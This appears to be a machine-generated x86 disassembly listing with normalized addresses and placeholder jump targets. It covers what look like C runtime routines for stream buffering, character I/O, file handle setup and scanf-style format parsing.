mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
push ebx
call sub_4c8724
pop ecx
cmp esi 0x1
jne r-xdata
or eax 0xffffffff
jmp r-xdata
and [ ebx + 0x12 ] 0xfe5f
xor edx edx
mov [ ebx + 0x8 ] edx
mov ecx [ ebx + 0x4 ]
mov [ ebx ] ecx
push esi
push edi
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c6198
add esp 0xc
inc eax
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor edx edx
or edx 0xffffffff
jmp r-xdata
push ebx
call sub_4c6b24
pop ecx
sub edi eax
mov esi edx
push ebx
call sub_4c87ec
pop ecx
mov eax esi
sub_4c6c00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c8724
pop ecx
push 0x1
push 0x0
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c6198
add esp 0xc
mov esi eax
inc eax
je r-xdata
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jge r-xdata
push ebx
call sub_4c6b24
pop ecx
sub esi eax
movsx edx [ ebx + 0x16 ]
test [ edx * 4 + rw-data ] 0x8
je r-xdata
push ebx
call sub_4c6b24
pop ecx
add esi eax
jmp r-xdata
mov edi esi
push 0x2
push 0x0
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c6198
add esp 0xc
mov esi eax
inc eax
jne r-xdata
push 0x0
push edi
movsx edx [ ebx + 0x16 ]
push edx
call sub_4c6198
add esp 0xc
inc eax
jne r-xdata
jmp r-xdata
or esi 0xffffffff
jmp r-xdata
sub_4c6cac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
push esi
call sub_4c8724
mov edx ebx
pop ecx
imul edx edi
push esi
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c6a48
add esp 0xc
xor edx edx
div ebx
mov ebx eax
push esi
call sub_4c87ec
pop ecx
mov eax ebx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4c6d38
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_4c6cf4
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov esi [ rw-data ]
shl esi 0x2
push esi
call sub_4c428c
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + ebx * 4 ]
push eax
call sub_4cffe8
pop ecx
pop esi
pop ebx
pop ebp
retn
call sub_4c6d28
push rw-data
mov edx ebx
shl edx 0x2
add edx eax
push edx
call sub_4cff84
add esp 0x8
push esi
push 0x0
mov edx [ rw-data ]
push edx
call sub_4c4d44
add esp 0xc
push rw-data
call sub_4d0008
pop ecx
sub_4c6dcc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0xde
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ rw-data ]
mov edx [ eax + esi * 4 ]
push edx
call sub_4cfff8
pop ecx
test ebx ebx
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + esi * 4 ]
push edx
call sub_4d0064
pop ecx
dec eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn
call sub_4c6d04
mov ebx 0x1
sub_4c6e34
push ebp
mov ebp esp
xor eax eax
mov edx rw-data
jmp r-xdata
cmp eax [ rw-data ]
jl r-xdata
cmp [ edx ] 0x0
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
inc eax
add edx 0x4
mov edx [ ebp + 0xc ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_4c6e74
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ rw-data ]
cmp edx ecx
jbe r-xdata
xor eax eax
mov edx rw-data
jmp r-xdata
or eax 0xffffffff
pop ebp
retn
cmp edx eax
ja r-xdata
cmp eax [ rw-data ]
jge r-xdata
mov edx [ ecx * 4 + rw-data ]
test edx edx
je r-xdata
cmp [ edx ] 0x0
jne r-xdata
or eax 0xffffffff
pop ebp
retn
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
inc eax
add edx 0x4
mov [ eax * 4 + rw-data ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
sub_4c6ef8
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ rw-data ]
test eax eax
push esi
mov esi [ ebp + 0x8 ]
lea edx [ eax * 4 + rw-data ]
je r-xdata
test esi esi
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov [ esi ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
add esi 0x4
mov [ ebp - 0x8 ] rw-data
cmp eax [ ebp - 0x4 ]
jle r-xdata
test eax eax
jne r-xdata
dec eax
add edx 0xfffffffc
test eax eax
jne r-xdata
shl eax 0x2
push eax
push rw-data
push esi
call sub_4c4cb0
add esp 0xc
xor eax eax
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
test dh 0x8
je r-xdata
lea edx [ eax + eax * 4 ]
add edx 0x4
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
test dh 0x80
jne r-xdata
or cl 0x20
pop esi
pop ecx
pop ecx
pop ebp
retn
test dh 0x20
je r-xdata
or cl 0x80
mov [ esi ] cl
inc esi
inc [ ebp - 0x4 ]
add [ ebp - 0x8 ] 0x4
cmp eax [ ebp - 0x4 ]
jg r-xdata
or cl 0x40
sub_4c6f94
push ebx
push esi
push edi
add esp 0xffffffb4
push rw-data
push rw-data
call sub_4cff84
add esp 0x8
mov eax [ rw-data ]
push eax
call SetHandleCount
mov ebx eax
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] sub_4c6ef8
xor edx edx
mov [ esp + 0x4 ] edx
lea ecx [ esp + 0x8 ]
push ecx
call GetStartupInfoA
movzx eax [ esp + 0x3a ]
mov esi [ esp + 0x3c ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov edx [ esi ]
mov [ esp ] edx
add esi 0x4
mov ecx [ esp ]
lea ecx [ ecx + ecx * 4 ]
add ecx 0x4
cmp ecx eax
jne r-xdata
add esp 0x4c
pop edi
pop esi
pop ebx
retn
push 0xfffffff6
call GetStdHandle
mov [ rw-data ] eax
push 0xfffffff5
call GetStdHandle
mov [ rw-data ] eax
push 0xfffffff4
call GetStdHandle
mov [ rw-data ] eax
xor ebx ebx
mov esi rw-data
mov [ esp + 0x4 ] 0x1
xor ebx ebx
mov edi rw-data
cmp ebx [ esp ]
jge r-xdata
or [ esi ] 0x2000
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ esp ]
lea eax [ ebx * 4 + rw-data ]
jmp r-xdata
mov dl [ esi ]
inc esi
xor eax eax
test dl 0x20
je r-xdata
inc ebx
add esi 0x4
cmp ebx 0x2
jle r-xdata
or [ esi ] 0x10000
jmp r-xdata
and [ esi ] 0xffffdfff
cmp ebx [ rw-data ]
jb r-xdata
test dl 0x40
je r-xdata
or eax 0x800
push ebx
call sub_4c6150
pop ecx
test eax eax
jne r-xdata
xor edx edx
inc ebx
mov [ eax ] edx
add eax 0x4
mov ecx [ esp ]
shl ecx 0x2
push ecx
push esi
push rw-data
call sub_4c4cf8
add esp 0xc
test dl 0x80
je r-xdata
or eax 0x2000
or eax 0x8000
or eax 0x4000
jmp r-xdata
mov ecx [ edi ]
and ecx 0x3
or ecx eax
mov [ edi ] ecx
inc ebx
add edi 0x4
cmp ebx [ esp ]
jl r-xdata
sub_4c710c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jl r-xdata
neg ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x12a
jbe r-xdata
mov ebx 0x1
call sub_4c7100
mov [ eax ] 0xffffffff
call sub_4c7100
mov [ eax ] ebx
movsx eax [ ebx + rw-data ]
mov ebx eax
jmp r-xdata
call sub_4ceadc
mov [ eax ] ebx
or eax 0xffffffff
pop ebx
pop ebp
retn
sub_4c718c
push ebx
push esi
mov esi 0x32
mov ebx rw-data
jmp r-xdata
mov edx esi
add esi 0xffffffff
test edx edx
jne r-xdata
movzx eax [ ebx + 0x12 ]
and eax 0x300
cmp eax 0x300
jne r-xdata
pop esi
pop ebx
retn
add ebx 0x18
push ebx
call sub_4c6910
pop ecx
sub_4c71c0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test [ ebx + 0x13 ] 0x2
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov edx [ ebx + 0x4 ]
mov [ ebx ] edx
push edx
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c6288
add esp 0xc
mov esi eax
mov [ ebx + 0x8 ] esi
mov eax esi
mov [ ebx + 0x8 ] eax
test eax eax
jle r-xdata
call sub_4c718c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0x12 ] 0xffdf
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ ebx + 0x8 ] ecx
or [ ebx + 0x12 ] 0x10
mov dx [ ebx + 0x12 ]
and dx 0xfe7f
or dx 0x20
mov [ ebx + 0x12 ] dx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_4c7248
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
jle r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
dec eax
mov [ ebx + 0x8 ] eax
mov edx [ ebx ]
inc [ ebx ]
mov al [ edx ]
xor edx edx
mov dl al
mov [ rw-data ] al
mov eax edx
pop ebx
pop ebp
retn
or [ ebx + 0x12 ] 0x10
or eax 0xffffffff
pop ebx
pop ebp
retn
test [ ebx + 0x12 ] 0x110
jne r-xdata
test [ ebx + 0x12 ] 0x1
jne r-xdata
or [ ebx + 0x12 ] 0x80
cmp [ ebx + 0xc ] 0x0
je r-xdata
test [ ebx + 0x13 ] 0x2
je r-xdata
push ebx
call sub_4c71c0
pop ecx
test eax eax
je r-xdata
push 0x1
push rw-data
movsx ecx [ ebx + 0x16 ]
push ecx
call sub_4c6288
add esp 0xc
test eax eax
jne r-xdata
call sub_4c718c
mov edx [ ebx + 0x8 ]
dec edx
mov [ ebx + 0x8 ] edx
mov ecx [ ebx ]
inc [ ebx ]
xor edx edx
mov al [ ecx ]
mov [ rw-data ] al
mov dl al
mov eax edx
pop ebx
pop ebp
retn
or eax 0xffffffff
pop ebx
pop ebp
retn
and [ ebx + 0x12 ] 0xffdf
xor eax eax
mov al [ rw-data ]
pop ebx
pop ebp
retn
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c60b8
pop ecx
dec eax
je r-xdata
mov dx [ ebx + 0x12 ]
and dx 0xfe7f
or dx 0x20
mov [ ebx + 0x12 ] dx
or [ ebx + 0x12 ] 0x10
jmp r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn
sub_4c7334
push ebx
push esi
mov esi 0x32
mov ebx rw-data
jmp r-xdata
mov edx esi
add esi 0xffffffff
test edx edx
jne r-xdata
movzx eax [ ebx + 0x12 ]
and eax 0x300
cmp eax 0x300
jne r-xdata
pop esi
pop ebx
retn
add ebx 0x18
push ebx
call sub_4c6910
pop ecx
sub_4c7368
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test [ ebx + 0x13 ] 0x2
je r-xdata
mov eax [ ebx + 0xc ]
shr eax 0x1
push eax
mov edx [ ebx + 0x4 ]
mov [ ebx ] edx
push edx
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c63d0
add esp 0xc
mov esi eax
mov [ ebx + 0x8 ] esi
mov eax esi
add eax eax
mov [ ebx + 0x8 ] eax
test eax eax
jle r-xdata
call sub_4c7334
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0x12 ] 0xffdf
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ ebx + 0x8 ] ecx
or [ ebx + 0x12 ] 0x10
mov dx [ ebx + 0x12 ]
and dx 0xfe7f
or dx 0x20
mov [ ebx + 0x12 ] dx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_4c73f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
jle r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
sub eax 0x2
mov [ ebx + 0x8 ] eax
mov edx [ ebx ]
add [ ebx ] 0x2
mov ax [ edx ]
movzx edx ax
mov [ rw-data ] ax
mov eax edx
pop ebx
pop ebp
retn
or [ ebx + 0x12 ] 0x10
or eax 0xffffffff
pop ebx
pop ebp
retn
test [ ebx + 0x12 ] 0x110
jne r-xdata
test [ ebx + 0x12 ] 0x1
jne r-xdata
or [ ebx + 0x12 ] 0x80
cmp [ ebx + 0xc ] 0x0
je r-xdata
test [ ebx + 0x13 ] 0x2
je r-xdata
push ebx
call sub_4c7368
pop ecx
test eax eax
je r-xdata
push 0x1
push rw-data
movsx ecx [ ebx + 0x16 ]
push ecx
call sub_4c63d0
add esp 0xc
test eax eax
jne r-xdata
call sub_4c7334
mov edx [ ebx + 0x8 ]
sub edx 0x2
mov [ ebx + 0x8 ] edx
mov ecx [ ebx ]
add [ ebx ] 0x2
mov ax [ ecx ]
movzx edx ax
mov [ rw-data ] ax
mov eax edx
pop ebx
pop ebp
retn
or eax 0xffffffff
pop ebx
pop ebp
retn
and [ ebx + 0x12 ] 0xffdf
movzx eax [ rw-data ]
pop ebx
pop ebp
retn
movsx eax [ ebx + 0x16 ]
push eax
call sub_4c60b8
pop ecx
dec eax
je r-xdata
mov dx [ ebx + 0x12 ]
and dx 0xfe7f
or dx 0x20
mov [ ebx + 0x12 ] dx
or [ ebx + 0x12 ] 0x10
jmp r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn
sub_4c74e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov bl [ ebp + 0x8 ]
mov [ ebp - 0x2 ] bl
mov esi 0x1
mov eax esi
neg eax
cmp eax [ edi + 0x8 ]
jle r-xdata
mov ax [ edi + 0x12 ]
test al 0x90
jne r-xdata
push esi
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ edi ]
push ecx
call sub_4c4cb0
add esp 0xc
add [ edi + 0x8 ] esi
add [ edi ] esi
test [ edi + 0x12 ] 0x8
je r-xdata
or [ edi + 0x12 ] 0x10
or eax 0xffffffff
jmp r-xdata
test al 0x2
jne r-xdata
xor eax eax
mov al bl
jmp r-xdata
xor eax eax
mov al bl
cmp eax 0xa
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
or [ edi + 0x12 ] 0x100
cmp [ edi + 0xc ] 0x0
je r-xdata
push edi
call sub_4c6910
pop ecx
test eax eax
je r-xdata
cmp eax 0xd
jne r-xdata
push esi
lea edx [ ebp - 0x2 ]
push edx
movsx ecx [ edi + 0x16 ]
push ecx
call sub_4c65c4
add esp 0xc
cmp esi eax
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov al bl
test [ edi + 0x13 ] 0x2
jne r-xdata
mov edx [ edi + 0xc ]
lea ecx [ ebp - 0x2 ]
neg edx
mov [ edi + 0x8 ] edx
push esi
push ecx
mov eax [ edi ]
push eax
call sub_4c4cb0
add esp 0xc
lea edx [ esi - 0x1 ]
add [ edi + 0x8 ] edx
add [ edi ] esi
test [ edi + 0x12 ] 0x8
je r-xdata
push edi
call sub_4c6910
pop ecx
test eax eax
je r-xdata
or [ edi + 0x12 ] 0x10
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov al bl
jmp r-xdata
xor eax eax
mov al bl
cmp eax 0xa
je r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_4c6910
pop ecx
test eax eax
je r-xdata
cmp eax 0xd
jne r-xdata
or eax 0xffffffff
jmp r-xdata
sub_4c7604
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov di [ ebp + 0x8 ]
movsx eax [ ebx + 0x16 ]
test [ eax * 4 + rw-data ] 0x40
je r-xdata
lea edx [ ebp - 0x2 ]
mov esi 0x2
mov [ edx ] di
push edi
lea edx [ ebp - 0x2 ]
push edx
call sub_4cc2fc
add esp 0x8
mov esi eax
inc eax
jne r-xdata
mov ax [ ebx + 0x12 ]
test al 0x90
jne r-xdata
push esi
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebx ]
push ecx
call sub_4c4cb0
add esp 0xc
add [ ebx + 0x8 ] esi
add [ ebx ] esi
test [ ebx + 0x12 ] 0x8
je r-xdata
mov eax esi
neg eax
cmp eax [ ebx + 0x8 ]
jle r-xdata
or eax 0xffffffff
jmp r-xdata
or [ ebx + 0x12 ] 0x10
or eax 0xffffffff
jmp r-xdata
test al 0x2
jne r-xdata
movzx eax di
jmp r-xdata
cmp di 0xa
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
or [ ebx + 0x12 ] 0x100
cmp [ ebx + 0xc ] 0x0
je r-xdata
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
cmp di 0xd
jne r-xdata
push esi
lea edx [ ebp - 0x2 ]
push edx
movsx ecx [ ebx + 0x16 ]
push ecx
call sub_4c65c4
add esp 0xc
cmp esi eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax di
test [ ebx + 0x13 ] 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
lea ecx [ ebp - 0x2 ]
neg edx
mov [ ebx + 0x8 ] edx
push esi
push ecx
mov eax [ ebx ]
push eax
call sub_4c4cb0
add esp 0xc
lea edx [ esi - 0x1 ]
add [ ebx + 0x8 ] edx
add [ ebx ] esi
test [ ebx + 0x12 ] 0x8
je r-xdata
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
or [ ebx + 0x12 ] 0x10
or eax 0xffffffff
jmp r-xdata
movzx eax di
jmp r-xdata
cmp di 0xa
je r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
cmp di 0xd
jne r-xdata
or eax 0xffffffff
jmp r-xdata
sub_4c7748
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push 0xa
test esi esi
jne r-xdata
push 0x1a
push 0x1c
call sub_4cfd70
add esp 0x8
mov ebx eax
mov eax esi
mov eax rw-data
jmp r-xdata
push eax
push ebx
call sub_4c50ec
add esp 0x8
push eax
movzx edx [ ebp + 0x10 ]
push edx
call sub_4cd0a0
add esp 0xc
push rw-data
push ebx
call sub_4c4dec
add esp 0x8
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4c77a0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov dx [ esi ]
push edx
push 0x0
push ebx
call sub_4c7748
add esp 0xc
mov ebx eax
push 0x0
push ebx
call j_sub_4c6000
add esp 0x8
test eax eax
je r-xdata
mov [ esi ] 0x1
inc [ esi ]
mov ax [ esi ]
test ax ax
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4c77e4
push ebp
mov ebp esp
add esp 0xfffffedc
xor eax eax
xor edx edx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x19 ] 0x25
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
mov ebx eax
je r-xdata
mov dl [ edi ]
inc edi
mov [ ebp - 0x19 ] dl
cmp dl 0x25
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
push 0xffffffff
call [ ebp + 0xc ]
add esp 0x8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor ecx ecx
mov esi 0x20
mov [ ebp - 0x3c ] ecx
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
jmp r-xdata
cmp bl [ ebp - 0x19 ]
je r-xdata
movsx eax [ ebp - 0x19 ]
and eax 0x7f
cmp [ eax + rw-data ] 0x1
jne r-xdata
movsx ecx [ ebp - 0x19 ]
and ecx 0x7f
movsx edx [ ecx + rw-data ]
mov edx 0x2
jmp r-xdata
xor ecx ecx
mov cl bl
test [ ecx + rw-data ] 0x4
je r-xdata
movsx edx bl
mov eax [ ebp + 0x10 ]
push eax
push edx
call [ ebp + 0xc ]
add esp 0x8
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
push ecx
push eax
mov edx [ ebp - 0x10 ]
and edx 0x7fff
push edx
mov ecx [ ebp - 0x14 ]
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c8050
add esp 0x1c
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
cmp [ ebp - 0xc ] 0x0
jl r-xdata
jmp [ ecx * 4 + jump_table_4c7957 ]
mov eax edx
mov ecx eax
cmp ecx 0x18
ja r-xdata
mov cl [ edi ]
inc edi
mov [ ebp - 0x19 ] cl
test cl cl
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
test bl 0x80
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
or esi 0x1
mov al [ edi ]
mov [ ebp - 0x19 ] al
inc edi
jmp r-xdata
or esi 0x2
mov al [ edi ]
mov [ ebp - 0x19 ] al
inc edi
jmp r-xdata
test esi 0x4
jne r-xdata
mov eax esi
mov dl [ edi ]
or eax 0x8
mov [ ebp - 0x19 ] dl
and eax 0xfffffffb
inc edi
mov esi eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and esi 0xffffffdf
mov al [ edi ]
mov [ ebp - 0x19 ] al
inc edi
jmp r-xdata
or esi 0x20
mov dl [ edi ]
mov [ ebp - 0x19 ] dl
inc edi
jmp r-xdata
cmp [ edi ] 0x36
jne r-xdata
mov [ ebp - 0x14 ] 0xa
jmp r-xdata
mov [ ebp - 0x14 ] 0x8
jmp r-xdata
mov [ ebp - 0x14 ] 0x10
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
push eax
push edx
push 0x8
push 0x10
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4c8050
add esp 0x1c
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
push eax
push edx
mov ecx [ ebp - 0x10 ]
and ecx 0x7fff
push ecx
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call j_sub_4ccc48#2
add esp 0x1c
cmp [ ebp - 0xc ] 0x0
jl r-xdata
test esi 0x4
je r-xdata
test esi 0x4
je r-xdata
push 0x20
push 0x0
lea edx [ ebp - 0x124 ]
push edx
call sub_4c4d44
add esp 0xc
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov bl [ edi ]
inc edi
cmp bl 0x5e
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x19 ] al
cmp [ ebp - 0x20 ] 0xffffffff
je r-xdata
movsx ecx bl
mov edx [ ebp + 0x10 ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
dec [ ebp - 0x8 ]
jmp r-xdata
movsx eax bl
and eax 0x7f
cmp [ eax + rw-data ] 0x1
je r-xdata
cmp [ ebp - 0x19 ] 0x41
jl r-xdata
test [ ebp - 0x19 ] 0x80
je r-xdata
mov edx esi
or edx 0x8
and edx 0xfffffffb
mov esi edx
jmp r-xdata
test esi 0x8
je r-xdata
mov ecx [ ebp - 0x10 ]
add ecx ecx
lea ecx [ ecx + ecx * 4 ]
movsx eax [ ebp - 0x19 ]
add ecx eax
add ecx 0xffffffd0
movsx ecx [ ebp - 0x19 ]
add ecx 0xffffffd0
jmp r-xdata
cmp [ edi ] 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
test esi 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test esi 0x2
je r-xdata
mov [ ebp - 0x3c ] 0x1
jmp r-xdata
test esi 0x2
je r-xdata
mov [ ebp - 0x3c ] 0x1
jmp r-xdata
mov [ ebp - 0x19 ] bl
test bl bl
je r-xdata
mov [ ebp - 0x18 ] 0x1
mov bl [ edi ]
inc edi
mov dl [ edi ]
inc edi
cmp dl [ ebp - 0x19 ]
je r-xdata
inc [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
mov ebx eax
je r-xdata
test esi 0x1
jne r-xdata
cmp [ ebp - 0x19 ] 0x5a
jg r-xdata
mov cl [ edi ]
inc edi
mov [ ebp - 0x19 ] cl
jmp r-xdata
or esi 0x4
mov [ ebp - 0x10 ] ecx
mov dl [ edi ]
inc edi
mov [ ebp - 0x19 ] dl
jmp r-xdata
cmp [ edi ] 0x31
jne r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
mov ecx esi
and ecx 0xfffffff9
or ecx 0x8
add edi 0x2
mov esi ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
mov [ ecx ] eax
inc [ ebp - 0x4 ]
jmp r-xdata
test esi 0x1
jne r-xdata
cmp eax 0x11
jne r-xdata
xor edx edx
mov [ ebp - 0x3c ] edx
jmp r-xdata
inc [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
mov ebx eax
je r-xdata
cmp eax 0x7
jne r-xdata
xor eax eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
test esi 0x1
jne r-xdata
movsx eax bl
mov ecx eax
and ecx 0x7
mov dl 0x1
shl dl cl
sar eax 0x3
and eax 0x1f
or [ ebp + eax - 0x124 ] dl
mov bl [ edi ]
inc edi
cmp bl 0x5d
je r-xdata
inc [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
movsx eax [ ebp - 0x19 ]
push eax
mov esi [ ebp + 0xc ]
call esi
movsx edx bl
add esp 0x8
mov eax [ ebp + 0x10 ]
push eax
push edx
call esi
add esp 0x8
jmp r-xdata
test esi 0x8
je r-xdata
cmp [ ebp - 0x19 ] 0x58
je r-xdata
cmp [ edi ] 0x38
jne r-xdata
cmp [ edi + 0x1 ] 0x36
jne r-xdata
mov eax esi
and eax 0xfffffff5
or eax 0x4
add edi 0x2
mov esi eax
jmp r-xdata
mov cl [ edi ]
inc edi
mov [ ebp - 0x19 ] cl
jmp r-xdata
push esi
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
push ecx
lea eax [ ebp - 0x34 ]
push eax
call j_sub_4ccc48
add esp 0xc
inc [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x3c ]
cmp ecx 0x1
sbb eax eax
neg eax
mov [ ebp - 0x3c ] eax
test bl 0x80
jne r-xdata
mov edx [ ebp - 0x3c ]
cmp edx 0x1
sbb ecx ecx
neg ecx
mov [ ebp - 0x3c ] ecx
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
cmp [ ebp - 0x3c ] 0x0
je r-xdata
